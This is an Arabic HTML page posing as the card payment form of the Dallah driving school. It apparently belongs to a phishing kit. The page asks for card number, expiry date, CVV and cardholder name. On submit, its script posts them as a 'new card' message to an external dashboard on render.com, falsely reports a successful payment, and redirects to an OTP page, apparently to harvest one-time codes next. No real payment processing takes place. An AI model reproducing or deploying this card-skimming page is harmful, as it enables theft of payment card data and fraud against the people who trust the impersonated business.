<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>دلة لتعليم القيادة - الدفع الإلكتروني</title>
  <style>
    body {font-family: "Tahoma", Arial, sans-serif; background: #f8f8f8; margin: 0; padding: 0;}
    .container {max-width: 420px; margin: 30px auto; background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; padding: 20px;}
    .logo { text-align: center; margin-bottom: 10px; }
    .logo img { max-width: 180px; width: 100%; height: auto; }
    h2 { font-size: clamp(16px, 2vw, 18px); text-align: center; margin: 15px 0; }
    .secure { background: #e6f4e6; padding: 8px; border-radius: 6px; font-size: clamp(12px, 2vw, 14px); text-align: center; margin-bottom: 15px; color: #2b7a2b; }
    .cards { text-align: center; margin-bottom: 20px; }
    .cards img { width: 45px; margin: 0 5px; max-width: 20%; height: auto; }
    .amounts {display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 15px;}
    .amounts label {display: block; padding: 10px; border: 1px solid #ccc; border-radius: 6px; cursor: pointer; text-align: center; font-size: 14px; background: #fafafa; transition: 0.3s;}
    .amounts input { margin-left: 6px; }
    .amounts label:hover { background: #f0f0f0; }
    .form-group { margin-bottom: 15px; }
    .form-group input {width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; font-size: 14px; box-sizing: border-box;}
    .row { display: flex; gap: 10px; }
    .row .form-group { flex: 1; }
    .submit-btn {width: 100%; background: #2b7a2b; color: #fff; font-size: 16px; padding: 12px; border: none; border-radius: 6px; cursor: pointer;}
    .submit-btn:hover { background: #256a25; }
    .card-preview { margin: 20px 0; display: flex; justify-content: center; }
    .card {width: 100%; max-width: 340px; height: 200px; border-radius: 15px; background: #001f6b; color: white; padding: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); display: flex; flex-direction: column; justify-content: space-between;}
    .card-header { display: flex; align-items: center; justify-content: space-between; }
    .chip { width: 40px; max-width: 20%; }
    .nfc { width: 28px; margin-left: 8px; }
    .bank-logo {background: radial-gradient(circle, #00bfff, #004488); color: #fff; padding: 5px 9px; border-radius: 50%; font-size: 12px; font-weight: bold;}
    .card-body { margin-top: 10px; }
    .card-name { font-size: clamp(14px, 2vw, 16px); margin-bottom: 8px; }
    .card-number {font-size: clamp(16px, 4vw, 20px); letter-spacing: 3px; font-family: "Courier New", monospace; direction: ltr; unicode-bidi: plaintext;}
    .card-footer { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
    .cvv-box, .expiry-box {border: 1px solid #ccc; padding: 4px 10px; font-size: 13px; background: #fff; color: #000; border-radius: 4px; min-width: 55px; text-align: center; margin: 3px;}
    .logos img { width: 35px; margin-left: 6px; }
    footer { text-align: center; padding: 15px; font-size: 13px; color: #555; }
    @media (max-width: 360px) {
      .card { height: 180px; padding: 15px; }
      .card-number { font-size: 14px; }
      .logos img { width: 28px; }
    }
    #inputNumber { direction: rtl; unicode-bidi: plaintext; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="images/sdadLogo.jpeg" alt="Dallah Driving"></div>
    <h2>معلومات الدفع الإلكتروني</h2>
    <div class="secure">دفع آمن %100 ... بياناتك معنا في حماية وأمان</div>

    <div class="cards">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">
      <img src="images/mada.png" alt="Mada">
    </div>

    <div class="amounts">
      <label><input type="radio" name="amount" value="500"> 500 ريال سعودي</label>
      <label><input type="radio" name="amount" value="650"> 650 ريال سعودي</label>
      <label><input type="radio" name="amount" value="1200"> 1200 ريال سعودي</label>
      <label><input type="radio" name="amount" value="1450" checked> 1450 ريال سعودي</label>
      <label><input type="radio" name="amount" value="2750"> 2750 ريال سعودي</label>
    </div>

    <div class="card-preview">
      <div class="card">
        <div class="card-header">
          <img src="https://img.icons8.com/color/48/000000/sim-card-chip.png" class="chip">
          <img src="https://img.icons8.com/ios-filled/40/ffffff/nfc-n.png" class="nfc">
          <div class="bank-logo">BANK</div>
        </div>
        <div class="card-body">
          <div class="card-name" id="cardName">الاسم على البطاقة</div>
          <div class="card-number" id="cardNumber">#### #### #### ####</div>
        </div>
        <div class="card-footer">
          <div class="cvv-box" id="cardCVV">CVV</div>
          <div class="expiry-box" id="cardExpiry">MM/YY</div>
          <div class="logos"></div>
        </div>
      </div>
    </div>

    <div class="form-group"><input type="text" id="inputNumber" placeholder="رقم البطاقة" maxlength="19"></div>
    <div class="row">
      <div class="form-group"><input type="text" id="inputExpiry" placeholder="تاريخ الإنتهاء (MM/YY)" maxlength="5"></div>
      <div class="form-group"><input type="text" id="inputCVV" placeholder="CVV" maxlength="3"></div>
    </div>
    <div class="form-group"><input type="text" id="inputName" placeholder="الاسم على البطاقة"></div>
    <button class="submit-btn" id="payBtn">تسديد</button>
  </div>

  <footer class="footer">
    <img src="images/circleLogo.jpeg" alt="Footer Logo" class="footer-logo">
    <p>جميع الحقوق محفوظة لشركة دله لتعليم القيادة © 2025</p>
  </footer>

<script>
document.getElementById("payBtn").addEventListener("click", async () => {
  const amount = document.querySelector("input[name='amount']:checked")?.value || "";

  const message = `
  💳 بطاقة جديدة:
  رقم البطاقة: ${inputNumber.value}
  تاريخ الانتهاء: ${inputExpiry.value}
  CVV: ${inputCVV.value}
  الاسم: ${inputName.value}
  المبلغ: ${amount} ريال
  `;

  try {
    const res = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: message })
    });

    const responseText = await res.text();
    console.log("🔎 Response status:", res.status);
    console.log("🔎 Response text:", responseText);

    if (res.ok) {
      alert("✅ تم الدفع وإرسال البيانات بنجاح");
      window.location.href = "otp.html";
    } else {
      alert(`❌ خطأ من الخادم (status: ${res.status}):\n${responseText}`);
    }
  } catch (err) {
    console.error("🚨 خطأ أثناء الإرسال:", err);
    alert("❌ حدث خطأ أثناء الإرسال\n" + err.message);
  }
});
</script>

</body>
</html>
